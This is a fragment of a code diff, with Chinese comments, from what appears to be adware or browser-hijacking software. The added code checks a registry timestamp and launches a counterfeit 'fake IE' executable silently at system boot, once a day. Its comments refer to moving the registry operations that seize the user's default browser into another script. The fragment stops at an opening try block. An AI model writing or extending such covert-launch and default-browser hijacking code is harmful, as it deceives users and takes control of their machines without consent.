@@ -83,12 +83,47 @@ function LnchInTime.Main()
 	var objCloudCount = new ClassCloudCount()
 	objCloudCount.Increase("yb DoSetDefaultBrowser enter")
 	
-	//抢默认浏览器相关注册表操作放到IE Onload.lua里做
+	var sLastRunTime = CommonFun.RegQueryValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\LastRunTime")
+	if (sLastRunTime)
+	{
+		var date = new Date();
+		var day = date.getDate()
+		var sday = ""
+		var month = date.getMonth() + 1
+		var smonth = ""
+		
+		var year = date.getFullYear()
+		if (day < 10)
+		{
+			sday = sday + "0" + day
+		}else
+		{
+			sday = sday + day
+		}
+		if (month < 10)
+		{
+			smonth = smonth + "0" + month
+		}else
+		{
+			smonth = smonth + month
+		}		
+		var sToday = "" + year + "-" + smonth + "-" + sday
+		// var sToday = date.format("yyyy-MM-dd")
+		CommonFun.log("sToday: " + sToday)
+		if (sToday == sLastRunTime)
+		{
+			return//今日已启动过伪IE
+		}
+	}
+	
 	// var bSucc = LnchInTime.DoSetDefaultBrowser()
 	var sFakeIEPath = LnchInTime.GetFakeIEPath()
 	if (sFakeIEPath)
 	{
-		sFakeIEPath = "\"" + sFakeIEPath + "\"" + " /setdefault"
+		sFakeIEPath = "\"" + sFakeIEPath + "\"" + " /sstartfrom sysboot" //无界面拉起伪IE
+		
+		//抢默认浏览器相关注册表操作放到IE Onload.lua里做
+		// sFakeIEPath = "\"" + sFakeIEPath + "\"" + " /setdefault"
 		CommonFun.log("get sFakeIEPath succ: " + sFakeIEPath)
 		
 		try        
